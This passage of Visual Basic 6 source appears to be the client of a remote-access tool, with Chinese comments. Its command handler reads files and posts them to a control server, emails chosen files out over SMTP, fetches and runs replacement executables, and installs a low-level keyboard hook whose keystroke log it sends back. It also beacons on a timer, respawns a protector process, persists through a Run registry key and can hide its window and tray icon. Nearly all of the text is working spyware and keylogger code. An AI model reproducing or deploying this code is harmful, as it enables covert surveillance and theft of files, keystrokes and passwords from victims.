            Email.Configuration.Fields.Item(names & "sendpassword") = SendMail.PassWord  '//你油箱的密码
            Email.Configuration.Fields.Update
            Email.Send
              backstring = MeNumber & "|" & Now & "|" & "Bcut send"
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "readfile"
            Open commands2 For Input As #10
            Dim tempread As String, uploadread As String
            Do While Not EOF(10)
                Line Input #10, tempread
                uploadread = uploadread & tempread
            Loop
            uploadread = "Read " & commands2 & " is OK and the result is:" & uploadread
            backstring = MeNumber & "|" & Now & "|" & "<br />" & uploadread
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "uploadfile"
            names = "http://schemas.microsoft.com/cdo/configuration/"
            Set Email = CreateObject("CDO.Message")
            Email.From = SendMail.UserName  ' //你自己的油箱号码
            Email.To = SendMail.UserName   ' // 发送到的油箱号码"(邪恶的加入了自己的邮箱)
            Email.Subject = "UPLOADFILE" ' //相当于邮件里的标题"
            Email.Textbody = MeNumber & "|" & Now & "  " & commands2 '//相当于邮件里的内容(记录了发送地ip)
            Email.Addattachment commands2 '附件的路径（这一点只能在源码中更改，需要时记得将前面的“ ' ”去掉）
            Email.Configuration.Fields.Item(names & "sendusing") = 2
            Email.Configuration.Fields.Item(names & "smtpserver") = SendMail.SMTP '//邮件服务器
            Email.Configuration.Fields.Item(names & "smtpserverport") = SendMail.Port  '//端口号
            Email.Configuration.Fields.Item(names & "smtpauthenticate") = 1
            Email.Configuration.Fields.Item(names & "sendusername") = left(SendMail.UserName, InStr(1, SendMail.UserName, "@") - 1) '//油箱号码@前面的名字
            Email.Configuration.Fields.Item(names & "sendpassword") = SendMail.PassWord  '//你油箱的密码
            Email.Configuration.Fields.Update
            Email.Send
              backstring = MeNumber & "|" & Now & "|" & "upload::" & commands2 & "  is ok"
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "getfile"
            i = InStrRev(commands2, "\")
            If i = 0 Then Exit Sub
            Flname = Mid(commands2, i + 1)
            Set shl = New Shell
            Set shfd = shl.NameSpace(left(commands2, i - 1))
            For i = 0 To 39
                If shfd.GetDetailsOf(0, i) <> "" And shfd.GetDetailsOf(shfd.Items.Item(Flname), i) <> "" Then
                    s = s & i & ":" & shfd.GetDetailsOf(0, i) & ": " & shfd.GetDetailsOf(shfd.Items.Item(Flname), i) & Chr(10)
                End If
            Next i
            backstring = MeNumber & "|" & Now & "|" & "readfileinfor::" & commands2 & "  is ok: " & s
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
        Case "update"
            Inet4.Execute commands2, "GET"
        Case "startup"
            If Not nfso.FileExists(GetPath & "20.txt") Then
                backstring = MeNumber & "|" & Now & "|" & "NOT FOUND UPDATE FILE"
                send_data = "MENU=" & GBKEncodeURI(backstring)
                my_head = "Content-Type: application/x-www-form-urlencoded"
                Inet2.Execute BackNet, "POST", send_data, my_head
            Else
                Dim files As File
                Set files = nfso.GetFile(GetPath & "system.exe")
                files.Name = "old.txt"
                Sleep 1000
                Set files = nfso.GetFile(GetPath & "20.txt")
                files.Name = "system.exe"
                Sleep 1000
                ShellExecute Me.hwnd, "open", GetPath & "system.exe", "", "", 0
                Sleep 1000
                backstring = MeNumber & "|" & Now & "|" & "START NEW SYSTEM NOW"
                send_data = "MENU=" & GBKEncodeURI(backstring)
                my_head = "Content-Type: application/x-www-form-urlencoded"
                Inet2.Execute BackNet, "POST", send_data, my_head
                i = 0
                Do
                    i = i + 1
                    Sleep 1000
                Loop Until ((Inet2.StillExecuting = False) Or (i = 15))
                End
            End If
        Case "startlog"
                Kill GetPath & "log.love"
                backstring = MeNumber & "|" & Now & "|" & "START LOG 500 SCEND"
                send_data = "MENU=" & GBKEncodeURI(backstring)
                my_head = "Content-Type: application/x-www-form-urlencoded"
                Inet2.Execute BackNet, "POST", send_data, my_head
        Case "stoplog"
                Open GetPath & "log.love" For Output As #2
                Close #2
                backstring = MeNumber & "|" & Now & "|" & "STOP LOG"
                send_data = "MENU=" & GBKEncodeURI(backstring)
                my_head = "Content-Type: application/x-www-form-urlencoded"
                Inet2.Execute BackNet, "POST", send_data, my_head
        Case "stop"
                UnhookWindowsHookEx HookID
                Timer3.Enabled = False
                Open GetPath & "system" For Output As #30
                Print #30, "shutdown"
                Close #30
                   backstring = MeNumber & "|" & Now & "|" & "will end sonn"
                send_data = "MENU=" & GBKEncodeURI(backstring)
                my_head = "Content-Type: application/x-www-form-urlencoded"
                Inet2.Execute BackNet, "POST", send_data, my_head
                Sleep 5000
                End
            Case "sapi"
                Dim sp As New SpVoice
                sp.Speak commands2
                   backstring = MeNumber & "|" & Now & "|" & "Speaked"
                send_data = "MENU=" & GBKEncodeURI(backstring)
                my_head = "Content-Type: application/x-www-form-urlencoded"
                Inet2.Execute BackNet, "POST", send_data, my_head
            Case "relaseprotect"
                Dim tempfile() As Byte
                Kill GetPath & "sprotect.exe"
                tempfile = LoadResData(101, "exe")
                Open GetPath & "sprotect.exe" For Binary Access Write As #29
                Put #29, , tempfile
                Close #29
              backstring = MeNumber & "|" & Now & "|" & "Relased"
                send_data = "MENU=" & GBKEncodeURI(backstring)
                my_head = "Content-Type: application/x-www-form-urlencoded"
                Inet2.Execute BackNet, "POST", send_data, my_head
            Case "startkey"
                If AllowBoard = 0 Then
                        SendBackDiyData "客户端禁止开启键盘监控"
                        Exit Sub
                End If
                HookID = SetWindowsHookEx(WH_KEYBOARD_LL, AddressOf CallKeyHookProc, App.hInstance, &O0)
                Timer5.Enabled = True
                backstring = MeNumber & "|" & Now & "|" & "KEY START MONITOR"
                send_data = "MENU=" & GBKEncodeURI(backstring)
                my_head = "Content-Type: application/x-www-form-urlencoded"
                Inet2.Execute BackNet, "POST", send_data, my_head
              Case "endkey"
                Timer5.Enabled = False
                UnhookWindowsHookEx HookID
                backstring = MeNumber & "|" & Now & "|" & "KEY END MONITOR"
                send_data = "MENU=" & GBKEncodeURI(backstring)
                my_head = "Content-Type: application/x-www-form-urlencoded"
                Inet2.Execute BackNet, "POST", send_data, my_head
            Case "lookkey"
                Dim stated As String
                     If AllowBoard = 0 Then
                        SendBackDiyData "客户端禁止开启键盘监控"
                        Exit Sub
                End If
                If Timer5.Enabled Then stated = "alive" Else stated = "die"
                backstring = MeNumber & "|" & Now & "|" & "KEY is " & stated
                send_data = "MENU=" & GBKEncodeURI(backstring)
                my_head = "Content-Type: application/x-www-form-urlencoded"
                Inet2.Execute BackNet, "POST", send_data, my_head
            Case "getkey"
                Dim keyfile As String
                If AllowBoard = 0 Then
                        SendBackDiyData "客户端禁止开启键盘监控"
                        Exit Sub
                End If
                Open GetPath & "key.sys" For Input As #32
                Do While Not EOF(32)
                    Line Input #32, temp
                    keyfile = keyfile & temp
                Loop
                Close #32
                backstring = MeNumber & "|" & Now & "|" & "KEY is " & "<br />" & keyfile
                send_data = "MENU=" & GBKEncodeURI(backstring)
                my_head = "Content-Type: application/x-www-form-urlencoded"
                Inet2.Execute BackNet, "POST", send_data, my_head
            Case "testendkey"
                UnhookWindowsHookEx HookID
                End
        End Select
    Open GetPath & "time.txt" For Output As #2
    Print #2, Trim(Year(Now)) & Trim(Format(Month(Now), "00")) & Trim(Format(Day(Now), "00")) & Trim(Format(Hour(Now), "00")) & Trim(Format(Minute(Now), "00")) & Trim(Format(Second(Now), "00"))
    Close
    Exit Sub
errhand:
      backstring = MeNumber & "|" & Now & "|" & err.Description
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
    Resume Next
    Exit Sub
End Sub

Private Sub Timer2_Timer()
On Error Resume Next
 Dim TempPath As String, get_data() As Byte, backstring As String, send_data As String, my_head As String
    youknow = youknow + 1
    Dim nfso As New FileSystemObject
    If nfso.FileExists(GetPath & "log.love") Then Exit Sub
    If youknow Mod 5 = 0 Then
        backstring = MeNumber & "|" & Now & "|" & "NOW I AM STILL !STILL DARING !"
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
                Inet3.Execute BackNet, "POST", send_data, my_head
    End If
End Sub

Private Sub Timer3_Timer()
On Error Resume Next
       If fun_FindProcess("sprotect.exe") = 0 Then  '
      ShellExecute Me.hwnd, "open", GetPath & "sprotect.exe", "", "", 1
    End If
End Sub

Private Sub Timer4_Timer()
    If nfso.FileExists(GetPath & "open.call") Then
        Kill GetPath & "open.call"
        chkautohide.Value = 0
        Call chkautohide_Click
    End If
End Sub

Private Sub Timer5_Timer()
    UnhookWindowsHookEx HookID
    Open GetPath & "key.sys" For Output As #31
        Print #31, Hookpass
    Close #31
    HookID = SetWindowsHookEx(WH_KEYBOARD_LL, AddressOf CallKeyHookProc, App.hInstance, &O0)
End Sub

Sub ChangeValue()
    On Error Resume Next
    Set w = CreateObject("wscript.shell")
    If AutoRun = 1 Then
        w.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & App.EXEName, GetPath & App.EXEName & ".exe"
    Else
        w.regdelete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & App.EXEName
    End If
    If AutoHide = 1 Then
        frmmain.Hide
    Else
        frmmain.Show
    End If
    If HideTray = 1 Then
            If ISTray Then
                Tray.RemoveFromTray
                ISTray = False
            End If
    Else
        If Not ISTray Then
      '   Tray.RemoveFromTray
            Tray.AddToTray Me
            Tray.SetTrayTip "远程控制"
            Tray.SetMenu mmutray
            ISTray = True
        End If
    End If
    If StopControl = 1 Then
        Timer1.Enabled = False
        Timer2.Enabled = False
    Else
        Timer1.Enabled = True
        Timer2.Enabled = True
    End If
End Sub
Sub SendBackDiyData(ByVal datas As String)
           Dim TempPath As String, get_data() As Byte, backstring As String, send_data As String, my_head As String
            backstring = MeNumber & "|" & Now & "|" & datas
            send_data = "MENU=" & GBKEncodeURI(backstring)
            my_head = "Content-Type: application/x-www-form-urlencoded"
            Inet2.Execute BackNet, "POST", send_data, my_head
End Sub
Sub EndProcess()
    On Error Resume Next
    Tray.RemoveFromTray
    SetWindowLong Me.hwnd, GWL_WNDPROC, preWinProc
    UnregisterHotKey Me.hwnd, uVirtKey
    Inet1.Cancel
    Inet2.Cancel
    Inet3.Cancel
    Inet4.Cancel
    Sleep 500
    End
End Sub
